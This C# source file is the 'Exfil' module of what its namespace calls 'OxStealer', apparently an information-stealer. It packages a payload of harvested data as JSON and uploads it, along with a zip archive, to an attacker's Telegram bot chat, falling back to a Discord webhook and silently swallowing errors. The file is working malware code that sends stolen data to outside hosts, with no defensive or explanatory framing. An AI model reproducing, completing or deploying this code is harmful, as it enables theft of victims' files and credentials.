using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace OxStealer.Modules
{
    internal static class Exfil
    {
        static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(60) };

        public static async Task Send(Dictionary<string, object> payload, string zipPath)
        {
            var json = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = true });

            if (!string.IsNullOrEmpty(Config.TgToken) && !string.IsNullOrEmpty(Config.TgChat))
            {
                if (await Telegram(json, zipPath)) return;
            }
            if (!string.IsNullOrEmpty(Config.WhUrl))
                await DiscordWebhook(json, zipPath);
        }

        static async Task<bool> Telegram(string text, string zipPath)
        {
            try
            {
                var url = $"https://api.telegram.org/bot{Config.TgToken}/sendMessage";
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("chat_id", Config.TgChat),
                    new KeyValuePair<string, string>("text", text.Length > 4000 ? text.Substring(0, 4000) : text),
                });
                var r = await Http.PostAsync(url, content);
                if (!r.IsSuccessStatusCode) return false;

                if (!string.IsNullOrEmpty(zipPath) && File.Exists(zipPath))
                {
                    var fileUrl = $"https://api.telegram.org/bot{Config.TgToken}/sendDocument";
                    using var form = new MultipartFormDataContent();
                    form.Add(new StringContent(Config.TgChat), "chat_id");
                    form.Add(new ByteArrayContent(File.ReadAllBytes(zipPath)), "document", Path.GetFileName(zipPath));
                    await Http.PostAsync(fileUrl, form);
                }
                return true;
            }
            catch { return false; }
        }

        static async Task DiscordWebhook(string text, string zipPath)
        {
            try
            {
                var content = new MultipartFormDataContent();
                content.Add(new StringContent(text.Length > 1900 ? text.Substring(0, 1900) : text), "content");
                if (!string.IsNullOrEmpty(zipPath) && File.Exists(zipPath))
                    content.Add(new ByteArrayContent(File.ReadAllBytes(zipPath)), "file", Path.GetFileName(zipPath));
                await Http.PostAsync(Config.WhUrl, content);
            }
            catch { }
        }
    }
}